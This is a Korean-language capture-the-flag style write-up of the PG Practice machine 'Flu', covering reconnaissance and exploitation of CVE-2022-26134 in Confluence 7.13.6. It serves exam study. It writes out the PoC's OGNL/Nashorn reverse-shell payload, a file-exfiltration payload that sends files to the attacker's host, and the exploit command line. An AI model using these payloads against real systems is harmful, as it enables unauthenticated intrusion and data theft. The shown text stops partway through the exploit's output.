---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/ssti
  - tech/enum/searchsploit
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.103.41
ports: [22, 8090, 8091]
services: [http, jamlink, ssh]
cves: [CVE-2022-26134]
status: solved
manual_tags: true
manual_cves: true
tech_count: 3
---
> [!info] PG Practice — **Flu** · Intermediate
> **타겟** 192.168.103.41 · **OS** Linux (Ubuntu, OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 → 22.04 계열) · **난이도** Intermediate · **플래그 2개 중 1개 획득**
> **경로 요약** 8090 Atlassian Confluence **7.13.6** → **CVE-2022-26134** (URI 경로의 OGNL 주입 → Nashorn → `ProcessBuilder`) → `confluence` 사용자 리버스셸 → `/home/confluence/local.txt`
> **권한상승은 미완이다.** `proof.txt`를 얻지 못했다. 그 사실과 그 이유를 §4에 정직하게 남긴다.

> [!danger] 이 노트를 읽는 규약 — 이 박스는 **1/2 이다**
> `03. PG/_STATUS.md`의 판정이 맞다: **Flu는 부분 완료(1/2)** 다.
> 프론트매터의 `status: solved` 는 사람이 적은 값이 아니라 `_INDEX/_tools/extract.py` 가
> **본문에 `local.txt` 문자열이 있으면 무조건 "완료"로 찍는** 자동 판정이다
> (`SOLVED_RE = r"root\.txt|proof\.txt|local\.txt|nt authority\\system|uid=0\(root\)"`).
> 즉 **이 프론트매터는 근거가 아니다.** 이 박스의 root는 아직 남아 있다.

> [!warning] 관측된 것과 재구성한 것을 구분하라
> Kali 산출물은 `~/PG/Flu/` 에 **`nmap.log` 와 `through_the_wire/` 클론 두 개뿐**이다. 그래서:
> - **실증됨** — §1-1 nmap(`nmap.log` 원문 대조) · §1-2 버전 7.13.6(스크린샷) · §2 페이로드 해부와 argparse 기본값(**디스크의 `through_the_wire.py` 원문**) · §3 실행 출력(원본 노트 보존) · §6 시행착오 명령(**`~/.zsh_history` 회수**) · §6 오류 문구(Kali에서 직접 재현)
> - **관측 없음** — 셸을 잡은 뒤의 열거(`sudo -l`·`find -perm -4000`·`getcap`)는 **한 줄도 기록이 없다.** 리버스셸 안에서 한 일은 `~/.zsh_history` 에 남지 않기 때문이다.
>
> 따라서 §4에는 **터미널 블록이 없다.** 열거 결과를 지어내는 대신 "다음에 뭘 쳐야 하는가"만 산문으로 적는다.

---

## 0. 이 박스에서 배우는 것

- **OGNL 주입 = 표현식 주입(SSTI)의 Java 판** — `${...}` 하나가 왜 임의 코드 실행이 되는가. Confluence·Struts2 계열의 반복 유형이다
- **URI 경로 자체가 페이로드가 될 수 있다** — 파라미터도 헤더도 아니고 **경로 세그먼트**에 넣는다. 그래서 WAF·로그 필터가 자주 놓친다
- **익스플로잇이 주는 권한 = 그 서비스의 실행 계정**이다. RCE를 얻었다고 root가 아니다. Confluence는 `confluence` 사용자로 돈다
- **nmap의 서비스 이름을 제품 이름으로 착각하지 않기** — `8091/tcp open jamlink?` 의 `jamlink` 는 **포트 번호로 찾은 표 이름**이지 지문 식별 결과가 아니다
- **searchsploit 제목의 버전 범위를 믿지 않기** — "Confluence < 8.5.3" 이라 적힌 익스플로잇이 실제로는 **8.0 이상 전용**이었다
- **파일 읽기 프리미티브가 조용히 실패하는 법** — 예외가 나면 아무것도 안 온다. "빈 응답 = 파일 없음"이 아니다

> [!tip] 시험 출제 가능성
>
> | 요소 | 출제 가능성 | 이유 |
> |---|---|---|
> | **`${...}` 표현식 주입 → RCE** | **매우 높음** | OGNL(Confluence·Struts2)·SpEL(Spring)·Freemarker·Velocity·Jinja2 전부 같은 사고다. `${7*7}` 이 `49`로 렌더되는 순간이 시험의 전형적인 분기점이다 |
> | **공개 PoC를 버전 대조 후 투입** | **매우 높음** | OSCP는 exploit-db/GitHub 익스플로잇 사용을 **전제로 설계된 시험**이다. 문제는 "쓰느냐"가 아니라 **"맞는 걸 고르느냐"** 다 |
> | **서비스 계정 → root 권한상승** | **매우 높음** | 이 박스에서 내가 실패한 바로 그 구간이다 |
> | Confluence 자체 | 낮음 | 제품은 안 나온다. **유형**이 나온다 |
>
> 변형은 이런 모습이다 — Confluence 대신 Struts2(`%{...}`), Nashorn 대신 Freemarker `Execute()`, 경로 주입 대신 `Content-Type` 헤더 주입. **원리는 동일하다.**

---

## 1. 정찰

### 1-1. Nmap

`nnmap` 은 오타가 아니라 별칭이다. `~/.zshrc:247` 에 이렇게 정의돼 있다:

```
alias nnmap='nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log'
```

| 플래그 | 역할 | **빼면 어떻게 되는가** |
|---|---|---|
| `-p-` | 65535 포트 전부 | 이 박스는 **8090·8091이 둘 다 top-1000 밖**이라 기본 스캔으로는 **SSH만 보인다.** 박스가 통째로 사라진다 |
| `-sCV` | 기본 NSE + 버전 탐지 | `http-title: Log In - Confluence` 가 안 나온다. 포트만 보고 제품을 못 맞힌다 |
| `-Pn` | 핑 스킵 | ICMP 차단 호스트를 "down"으로 버린다 |
| `--min-rate 5000` | 초당 최소 패킷 | 이 스캔이 **129초**에 끝난 이유. 없으면 `-p-`가 수십 분이 된다 |
| `-oN nmap.log` | 결과 파일 | 나중에 대조할 1차 사료가 사라진다 |

```bash
┌──(kali㉿kali)-[~/PG/Flu]
└─$ nnmap 192.168.103.41
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-14 13:51 +0900
Nmap scan report for 192.168.103.41
Host is up (0.085s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 02:79:64:84:da:12:97:23:77:8a:3a:60:20:96:ee:cf (ECDSA)
|_  256 dd:49:a3:89:d7:57:ca:92:f0:6c:fe:59:a6:24:cc:87 (ED25519)
8090/tcp open  http     Apache Tomcat (language: en)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Log In - Confluence
|_Requested resource was /login.action?os_destination=%2Findex.action&permissionViolation=true
8091/tcp open  jamlink?
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Tue, 14 Jul 2026 04:52:41 GMT
|     Connection: Close
|   GetRequest:
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Tue, 14 Jul 2026 04:52:09 GMT
|     Connection: Close
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Tue, 14 Jul 2026 04:52:09 GMT
|     Connection: Close
|     content-length: 0
|   Help, Kerberos, LDAPSearchReq, LPDString, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 414 Request-URI Too Long
|     text is empty (possibly HTTP/0.9)
|   RTSPRequest:
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Tue, 14 Jul 2026 04:52:10 GMT
|     Connection: Keep-Alive
|     content-length: 0
|   SIPOptions:
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Tue, 14 Jul 2026 04:52:47 GMT
|     Connection: Keep-Alive
|_    content-length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8091-TCP:V=7.98%I=7%D=7/14%Time=6A55C079%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,68,"HTTP/1\.1\x20204\x20No\x20Content\r\nServer:\x20Aleph/0\.4
SF:\.6\r\nDate:\x20Tue,\x2014\x20Jul\x202026\x2004:52:09\x20GMT\r\nConnect
SF:ion:\x20Close\r\n\r\n")%r(HTTPOptions,EC,"HTTP/1\.1\x20200\x20OK\r\nAcc
SF:ess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Max-Age:\x2031536000\
SF:r\nAccess-Control-Allow-Methods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r\
SF:nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Tue,\x2014\x20Jul\x202026\x2004:5
SF:2:09\x20GMT\r\nConnection:\x20Close\r\ncontent-length:\x200\r\n\r\n")%r
SF:(RTSPRequest,F1,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Origin:
SF:\x20\*\r\nAccess-Control-Max-Age:\x2031536000\r\nAccess-Control-Allow-M
SF:ethods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r\nServer:\x20Aleph/0\.4\.6
SF:\r\nDate:\x20Tue,\x2014\x20Jul\x202026\x2004:52:10\x20GMT\r\nConnection
SF::\x20Keep-Alive\r\ncontent-length:\x200\r\n\r\n")%r(Help,46,"HTTP/1\.1\
SF:x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(po
SF:ssibly\x20HTTP/0\.9\)")%r(SSLSessionReq,46,"HTTP/1\.1\x20414\x20Request
SF:-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(possibly\x20HTTP/0\
SF:.9\)")%r(TerminalServerCookie,46,"HTTP/1\.1\x20414\x20Request-URI\x20To
SF:o\x20Long\r\n\r\ntext\x20is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(T
SF:LSSessionReq,46,"HTTP/1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\n
SF:text\x20is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(Kerberos,46,"HTTP/
SF:1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x2
SF:0\(possibly\x20HTTP/0\.9\)")%r(FourOhFourRequest,68,"HTTP/1\.1\x20204\x
SF:20No\x20Content\r\nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Tue,\x2014\x20J
SF:ul\x202026\x2004:52:41\x20GMT\r\nConnection:\x20Close\r\n\r\n")%r(LPDSt
SF:ring,46,"HTTP/1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20
SF:is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(LDAPSearchReq,46,"HTTP/1\.
SF:1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(
SF:possibly\x20HTTP/0\.9\)")%r(SIPOptions,F1,"HTTP/1\.1\x20200\x20OK\r\nAc
SF:cess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Max-Age:\x2031536000
SF:\r\nAccess-Control-Allow-Methods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r
SF:\nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Tue,\x2014\x20Jul\x202026\x2004:
SF:52:47\x20GMT\r\nConnection:\x20Keep-Alive\r\ncontent-length:\x200\r\n\r
SF:\n");
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   85.01 ms 192.168.45.1
2   84.99 ms 192.168.45.254
3   84.63 ms 192.168.251.1
4   84.67 ms 192.168.103.41

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.25 seconds
```

**이 출력에서 읽어야 할 세 줄:**

1. `http-title: Log In - Confluence` — 제품 확정. Tomcat은 껍데기이고 알맹이는 Confluence다
2. `Requested resource was /login.action?...&permissionViolation=true` — `.action` 확장자는 **WebWork/Struts2 액션 매핑**이다. 이 한 글자가 "OGNL 표현식 엔진이 안에 있다"는 신호다
3. `8091/tcp open jamlink?` — **뒤의 `?` 가 핵심이다.** §1-3 참조

### 1-2. 버전 판정 — 근거 2개 교차

8090 포트에 접속하면 로그인 페이지 하단에 버전이 박혀 있다.

![[Pasted image 20260714140908.png]]

> [!note] 근거 ①과 근거 ②
> - **근거 ①(스크린샷)** — 로그인 페이지 푸터: `Atlassian Confluence에 의해 제공 7.13.6`
> - **근거 ②(익스플로잇 저자의 시험 환경)** — 디스크의 `through_the_wire.py` 헤더가 `Version: All LTS <= 7.13.6 and all others <= 7.18.0`, `Tested on: 7.13.6 LTS / Ubuntu 20.04`
>
> 두 근거가 **출처가 다르다**(타겟 자신 / 익스플로잇 저자). 누적 교훈 2번("버전 판정은 독립 근거 2개")을 만족한다. [[Hub]]·[[Levram]] 참조.
>
> 참고로 nmap의 OS 추정(`MikroTik RouterOS 7.2 - 7.5`)은 **무시해도 된다.** SSH 배너 `OpenSSH 9.0p1 Ubuntu 1ubuntu8.5` 가 훨씬 강한 근거이고, `-p-` 스캔에서 열린 포트가 3개뿐이라 OS 지문 표본이 빈약했다.

### 1-3. `jamlink` 는 제품이 아니다 — 8091의 정체

원본 노트에는 *"다른 포트 `8090/tcp open jamlink` 검색 시 atlassian CVE 발견"* 이라고 적혀 있었다. **두 군데가 틀렸다**: `jamlink` 로 뜬 건 8090이 아니라 **8091**이고, `jamlink` 는 제품명이 아니다.

Kali의 `nmap-services` 표를 직접 열어 확인했다:

```bash
┌──(kali㉿kali)-[~]
└─$ grep -E "^\S+\s+809[01]/tcp" /usr/share/nmap/nmap-services
opsmessaging	8090/tcp	0.000304	# Vehicle to station messaging
jamlink	8091/tcp	0.000000	# Jam Link Framework
```

> [!danger] nmap의 SERVICE 열은 두 가지가 섞여 나온다
> - **지문 식별 성공** → 실제 제품명 (예: `ssh  OpenSSH 9.0p1 Ubuntu 1ubuntu8.5`)
> - **지문 식별 실패** → `nmap-services` 표에서 **포트 번호로 조회한 이름 + `?`**
>
> `8091/tcp open jamlink?` 의 `?` 가 바로 그것이다. 게다가 빈도값이 `0.000000` 이다 — 실측 표본에서 사실상 관측된 적 없는 항목이라는 뜻이다.
> **`?` 가 붙은 SERVICE 이름으로 exploit-db를 검색하는 것은 포트 번호표를 검색하는 것과 같다.** (§6-② 참조)
>
> 진짜 단서는 그 아래 `fingerprint-strings` 에 있다 — `Server: Aleph/0.4.6`. Aleph는 Clojure의 HTTP 서버 라이브러리다. 즉 8091은 **Confluence와 무관한 별개의 Clojure 서비스**이고, 모든 GET에 `204 No Content` 만 돌려준다. 이 박스에서는 끝내 쓰이지 않았다.

---

## 2. 취약점 분석 — CVE-2022-26134

### 2-1. 배경 지식 — OGNL 이란 무엇인가

**OGNL(Object-Graph Navigation Language)** 은 Java 객체 그래프를 문자열 표현식으로 탐색·조작하는 언어다. Struts2와 Atlassian의 WebWork가 뷰 계층에서 쓴다. 템플릿에 `${user.name}` 이라 쓰면 런타임에 `getUser().getName()` 이 호출되는 식이다.

문제는 OGNL이 **단순 프로퍼티 접근기가 아니라 완전한 표현식 언어**라는 것이다. 메서드 호출(`.getMethod(...).invoke(...)`), 정적 클래스 참조(`Class.forName(...)`), 객체 생성이 전부 된다. 그래서 **사용자 입력이 OGNL 평가 컨텍스트에 도달하면 그 자체로 임의 코드 실행**이다.

> [!note] 이것이 SSTI와 같은 계열인 이유
> Jinja2의 `{{ ''.__class__.__mro__[1].__subclasses__() }}`, Freemarker의 `<#assign x=...Execute()>`, SpEL의 `T(java.lang.Runtime).getRuntime().exec(...)` 와 **정확히 같은 사고**다.
> 렌더링 엔진이 "데이터"로 받아야 할 것을 "코드"로 평가한다.
> **시험 반사**: 입력이 그대로 화면에 되비치는 자리를 보면 `${7*7}` · `{{7*7}}` · `%{7*7}` · `<%= 7*7 %>` 를 차례로 넣어보고 **`49`가 렌더되는지** 본다.

### 2-2. 왜 취약한가 — 경로 세그먼트가 OGNL로 평가된다

CVE-2022-26134는 Confluence Server/Data Center의 **URI 경로 세그먼트가 OGNL 표현식으로 평가되는** 결함이다. Confluence는 액션 네임스페이스를 URL 경로에서 해석하는데, 이 네임스페이스 문자열이 검증 없이 OGNL 평가로 흘러 들어간다.

**데이터 흐름은 이렇다:**

```
GET /${OGNL 표현식}/  HTTP/1.1
      └─ 경로 세그먼트
         → 액션 네임스페이스로 파싱
           → OGNL 평가 컨텍스트에 진입          ← 여기가 결함
             → Class.forName(...) 등 임의 호출 성립
```

핵심은 **인증이 필요 없다**는 것이다. 라우팅/네임스페이스 해석은 인증 필터보다 앞에서 일어나므로, 로그인 페이지밖에 못 보는 상태에서 그대로 터진다. 스캔에서 본 `permissionViolation=true` 리다이렉트는 **방어가 아니라 아직 도달하지 않은 단계**였을 뿐이다.

> [!warning] 익스플로잇 자신의 CVE 표기가 틀려 있다
> 디스크의 `through_the_wire.py` 헤더에는 `# CVE : CVE-2022-26123` 이라고 적혀 있는데, 같은 파일의 배너는 `CVE-2022-26134` 를 출력한다. **헤더 쪽이 오타다.**
> 누적 교훈 9번("공개 익스플로잇의 CVE 표기를 검증하라")의 실물 사례다. 저자가 붙인 참조는 벤더·NVD 판정이 아니다.

### 2-3. 왜 이 페이로드인가 — 조각내어 읽기

`through_the_wire.py` 가 만드는 리버스셸 페이로드 원문(디스크의 소스에서 그대로 옮긴 것이다):

```python
exploit = '${Class.forName("com.opensymphony.webwork.ServletActionContext").getMethod("getResponse",null).invoke(null,null).setHeader("", Class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command(\'bash\',\'-c\',\'bash -i >& /dev/tcp/' + args.lhost + '/' + str(args.lport) + ' 0>&1\').start()"))}'
```

| 조각 | 역할 | 왜 필요한가 |
|---|---|---|
| `${ ... }` | OGNL 평가 마커 | 이게 없으면 그냥 존재하지 않는 경로 → 404 |
| `Class.forName("com.opensymphony.webwork.ServletActionContext")` | WebWork의 정적 컨텍스트 홀더 획득 | OGNL 컨텍스트에서 **현재 HTTP 응답 객체에 손을 뻗는 표준 통로** |
| `.getMethod("getResponse",null).invoke(null,null)` | 리플렉션으로 `HttpServletResponse` 획득 | 직접 호출이 막혀도 리플렉션은 통과한다 |
| `.setHeader("", ...)` | **결과를 버리는 곳** | 실행이 목적이고 값은 필요 없다. 빈 헤더명에 넣어 조용히 버린다 |
| `getEngineByName("nashorn").eval(...)` | JS 엔진으로 전환 | OGNL 문법으로 프로세스를 띄우는 것보다 **JS 한 줄이 훨씬 짧고 인용 충돌이 적다** |
| `new java.lang.ProcessBuilder().command('bash','-c','...')` | 실제 실행 | `Runtime.exec()` 와 달리 **인자 배열을 직접 준다** — 공백·리다이렉션이 깨지지 않는다 |
| `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` | 리버스셸 본체 | `bash -c` 로 감쌌기 때문에 `/dev/tcp` 가 동작한다 |

> [!danger] `bash -c` 로 감싸는 것이 선택이 아니라 필수인 이유
> `/dev/tcp/HOST/PORT` 는 **커널의 장치 파일이 아니라 bash가 내부에서 흉내 내는 가상 경로**다. bash가 아닌 셸에는 존재하지 않는다.
> `ProcessBuilder().command('bash','-i','>&','/dev/tcp/...')` 처럼 직접 넘기면 `>&` 가 **리다이렉션이 아니라 문자열 인자**가 되어 실패한다. 셸 문법을 쓰려면 반드시 셸에게 파싱을 시켜야 한다 — 그게 `bash -c` 다.
> 같은 함정의 다른 얼굴은 [[Squid]]·[[Exfiltrated]] 의 "인용이 깨지면 인코딩으로 도망간다" 항목에 있다.

마지막으로 페이로드는 **URL 인코딩되어 경로에 붙는다**:

```python
encoded_exploit = urllib.parse.quote(exploit)
target_url = args.protocol + args.rhost + ':' + str(args.rport) + '/'
target_url += encoded_exploit
target_url += '/'
```

**뒤에 붙는 `/` 가 중요하다.** 이것이 없으면 Confluence의 액션 매핑이 이 문자열을 네임스페이스로 잘라내지 못한다. 공개 분석들이 이 결함을 `/${...}/` 형태로 기술하는 이유다.

> [!warning] 그런데 `quote()` 는 슬래시를 인코딩하지 않는다 — 초고의 오류를 정정한다
> 이 노트의 초고는 *"페이로드가 완결된 **하나의** 경로 세그먼트로 인식된다"* 고 적었다. **틀렸다.**
> `urllib.parse.quote()` 의 `safe` 기본값은 `'/'` 다. 즉 **슬래시를 그대로 둔다.** Kali에서 확인했다:
>
> ```bash
> ┌──(kali㉿kali)-[~]
> └─$ python3 -c "import urllib.parse; p='\${...eval(\'bash -i >& /dev/tcp/10.0.0.1/1270 0>&1\')}'; print(urllib.parse.quote(p))"
> %24%7BClass.forName%28%22x%22%29.eval%28%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.1/1270%200%3E%261%27%29%7D
> ```
>
> `%3E%26`(`>&`)·`%20`(공백)·`%24%7B`(`${`)는 인코딩됐는데 **`/dev/tcp/10.0.0.1/1270` 의 슬래시는 살아 있다.**
> 따라서 실제로 나가는 요청의 경로는 **여러 세그먼트로 쪼개져 있다.** `--read-file /etc/passwd` 도 마찬가지다.
>
> [가정] 그럼에도 동작하는 이유는 Confluence가 이 구간을 **세그먼트 단위가 아니라 문자열 단위로** OGNL 평가에 넘기기 때문으로 보인다. 타겟이 정지돼 요청·응답을 직접 확인하지는 못했다. **관측된 사실은 "이 형태로 보냈고 실행됐다"까지다.**
>
> **실전적 함의**: 손으로 재현할 때 `--data-urlencode` 나 `quote(p, safe='')` 처럼 **슬래시까지 인코딩하면 오히려 실패할 수 있다.** 원본 스크립트와 같은 인코딩 수준을 유지하라. 이건 [[Squid]]·[[Hawat]] 의 "인용이 깨지면 인코딩으로 도망간다"와 **반대 방향의 교훈**이다 — 여기서는 **과잉 인코딩이 문제**다.

### 2-4. 파일 읽기 페이로드는 구조가 다르다

`--read-file` 을 주면 같은 껍데기 안의 JS만 갈아 끼운다:

```python
exploit = '${... .eval("var data = new java.lang.String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(\'' + args.read_file + '\')));var sock = new java.net.Socket(\'' + args.lhost + '\', ' + str(args.lport) + '); var output = new java.io.BufferedWriter(new java.io.OutputStreamWriter(sock.getOutputStream())); output.write(data); output.flush(); sock.close();"))}'
```

즉 **파일을 HTTP 응답으로 돌려주지 않는다.** 타겟이 Kali로 **별도의 TCP 연결을 새로 열어** 내용을 밀어 넣는다. 그래서 리스너가 반드시 있어야 하고, 스크립트가 알아서 `nc` 를 포크한다.

> [!danger] 실행 순서가 실패 모드를 결정한다
> JS를 순서대로 보라 — **`readAllBytes()` 가 먼저이고 `new java.net.Socket()` 이 그다음이다.**
> 따라서 **읽기 권한이 없으면 소켓이 아예 만들어지지 않는다.** 리스너는 연결조차 못 받고 조용히 앉아 있는다.
>
> **"아무것도 안 왔다"가 뜻하는 것:**
> - ❌ "파일이 없다" (아니다)
> - ❌ "익스플로잇이 안 통한다" (아니다)
> - ✅ **"읽으려다 예외가 났다"** — 십중팔구 **권한 부족**
>
> §6-③에서 내가 정확히 이 함정에 걸렸다. 누적 교훈 1번("응답이 성공을 뜻하지 않는다")의 **거울상**이다 — 여기서는 **무응답이 실패를 뜻하지도 않는다.** 무응답은 그저 정보가 없다는 뜻이다.

### 2-5. argparse 기본값 — 안 주면 어디로 가는가

디스크의 소스에서 그대로 읽은 정의다:

```python
parser.add_argument('--rport', ..., type=int, default="443")
parser.add_argument('--lport', ..., type=int, default="1270")
parser.add_argument('--protocol', ..., default="https://")
parser.add_argument('--fork-nc', action="store_true", dest="fork_nc", default=True, ...)
parser.add_argument('--nc-path', ..., default="/usr/bin/nc")
```

Kali에서 같은 파서를 떼어내 직접 돌려 기본값을 확인했다:

```bash
┌──(kali㉿kali)-[/tmp]
└─$ python3 argtest.py --rhost 1.2.3.4 --lhost 5.6.7.8 --read-file /etc/passwd
Namespace(rhost='1.2.3.4', rport=443, lhost='5.6.7.8', lport=1270, protocol='https://', reverse_shell=False, fork_nc=True, ncpath='/usr/bin/nc', read_file='/etc/passwd')
```

> [!warning] 그래서 `--rport 8090` 과 `--protocol http://` 는 **둘 다 필수다**
> 안 주면 `https://192.168.103.41:443/` 로 던진다. 그 포트는 **열려 있지도 않다**(`-p-` 스캔에 없다).
> 그러면 `requests.get()` 이 예외를 내고 스크립트는 `[-] The HTTP request failed` 만 찍고 끝난다 —
> **"익스플로잇이 안 통하는 박스"로 오판하기 딱 좋은 실패 모드다.**

> [!note] `--fork-nc` 는 끌 수 없다 (소스상의 버그)
> `action="store_true"` 인데 `default=True` 다. 즉 **플래그를 줘도 True, 안 줘도 True** — 아무리 해도 `False` 가 되지 않는다.
> 결과적으로 **스크립트가 항상 `nc -lvnp 1270` 을 포크한다.** 그래서 별도 리스너를 미리 띄워 두면 **포트 충돌**이 난다.
> 이 박스에서는 그냥 맡겨 뒀고, 실행 출력의 `listening on [any] 1270 ...` 이 포크가 실제로 동작했음을 보여준다.

### 2-6. 왜 하필 `nashorn` 인가 — 이 익스플로잇의 숨은 전제

페이로드는 OGNL 안에서 곧바로 프로세스를 띄우지 않고 **JS 엔진을 한 번 경유한다**:

```
getEngineByName("nashorn").eval("new java.lang.ProcessBuilder()...")
```

**Nashorn** 은 JDK 8에 들어온 자바스크립트 엔진이다. `javax.script.ScriptEngineManager` 로 이름만 대면 꺼내 쓸 수 있고, JS 코드에서 `java.*` 클래스를 그대로 부를 수 있다. 그래서 **"OGNL로 표현하기 번거로운 것을 JS로 짧게 쓰는 우회로"** 가 된다.

이 우회로를 쓰는 이유는 두 가지다:

1. **인용 계층이 줄어든다.** OGNL만으로 `ProcessBuilder` 에 문자열 배열을 넘기려면 OGNL 배열 문법과 이스케이프가 겹겹이 쌓인다. JS 한 줄이 훨씬 짧다
2. **OGNL 샌드박스 우회의 고전 패턴이다.** Confluence·Struts2는 OGNL 컨텍스트에 블랙리스트를 걸어 왔는데, `ScriptEngineManager` 를 거치면 **평가 주체가 바뀌어** 그 목록을 비껴간다

> [!warning] 그래서 이 익스플로잇에는 **Java 버전 전제**가 붙어 있다
> Nashorn은 JDK 11에서 **deprecated**(JEP 335), JDK 15에서 **제거**됐다(JEP 372). 제거된 런타임에서는 `getEngineByName("nashorn")` 이 **`null` 을 반환**하고, 그 뒤의 `.eval(...)` 이 NPE로 죽는다 — **결함은 그대로인데 페이로드만 불발한다.**
>
> [가정] 이 타겟이 성공한 것으로 보아 Confluence 7.13.6이 JDK 8 또는 11 위에서 돌고 있었다. 셸에서 `java -version` 을 확인한 기록이 없어 단정하지 않는다.
>
> **일반화 — 이게 시험에서 중요한 이유**: 같은 CVE에 PoC가 여러 개 있으면 **페이로드가 무엇에 의존하는지**가 선택 기준이 된다. Nashorn 판이 불발하면 같은 OGNL 진입점에 다른 실행 수단을 얹으면 된다:
>
> | 실행 수단 | 전제 | 비고 |
> |---|---|---|
> | `nashorn` + `ProcessBuilder` | JDK ≤ 14 | 이 PoC |
> | OGNL 직접 `ProcessBuilder` | 없음 | 인용이 지저분해진다 |
> | `Runtime.getRuntime().exec()` | 없음 | 셸 문법을 못 쓴다. `bash -c` 배열로 감싸야 한다 |
> | `javax.script` + `JavaScript`/`js` 이름 | GraalJS 탑재 시 | 최신 JDK의 대체 엔진 |
>
> **"익스플로잇이 안 통한다"의 원인이 결함 부재가 아니라 페이로드 부적합일 수 있다.** §6-③·§6-⑤와 같은 계열의 오판이다.

---

## 3. Foothold

### 3-1. 익스플로잇 확보

`searchsploit` 에는 7.13.6에 맞는 것이 없었다(§6-① 참조). GitHub의 Rapid7 PoC를 직접 클론했다.

```bash
┌──(kali㉿kali)-[~/PG/Flu]
└─$ git clone https://github.com/jbaines-r7/through_the_wire.git
Cloning into 'through_the_wire'...
remote: Enumerating objects: 25, done.
remote: Counting objects: 100% (25/25), done.
remote: Compressing objects: 100% (22/22), done.
Receiving objects: 100% (25/25), 11.17 KiB | 11.17 MiB/s, done.
Resolving deltas: 100% (12/12), done.
remote: Total 25 (delta 12), reused 8 (delta 3), pack-reused 0 (from 0)
```

![[Pasted image 20260714141236.png]]

> [!tip] OSCP 시험 규정 — 이건 허용이다
> 공개 PoC 스크립트는 **금지 대상이 아니다.** 금지 정의는 *"스스로 취약점을 **발견해** 자동으로 익스플로잇하는"* 도구다(`sqlmap`·`db_autopwn`·Nessus 계열).
> 특정 CVE 하나를 겨냥한 PoC는 스스로 아무것도 발견하지 않는다 — 내가 버전을 판정하고 내가 고른 것이다.
> Metasploit은 **금지가 아니라 1대 한정**이고, 이 박스는 msf를 쓰지 않았으므로 그 한 장을 아꼈다.

### 3-2. 파일 읽기로 실행 확인 — 먼저 `/etc/passwd`

리버스셸을 던지기 전에 **덜 시끄러운 프리미티브로 먼저 실행을 증명한다.** 셸이 안 붙으면 원인이 "익스플로잇 실패"인지 "아웃바운드 차단"인지 구분이 안 되기 때문이다. 파일 읽기가 되면 **RCE는 확정**이고 남은 변수는 네트워크뿐이다.

```bash
┌──(kali㉿kali)-[~/PG/Flu/through_the_wire]
└─$ python through_the_wire.py --rhost 192.168.103.41 --rport 8090 --lhost 192.168.45.244 --protocol http:// --read-file /etc/passwd
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:24: SyntaxWarning: invalid escape sequence '\ '
  print("  /__   \ |__  _ __ ___  _   _  __ _| |__  ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:25: SyntaxWarning: invalid escape sequence '\/'
  print("    / /\/ '_ \| '__/ _ \| | | |/ _` | '_ \ ")
/home/kali/PG/Flu/through_the_wire/through_the_wire.py:27: SyntaxWarning: invalid escape sequence '\/'
  print("   \/   |_| |_|_|  \___/ \__,_|\__, |_| |_|")
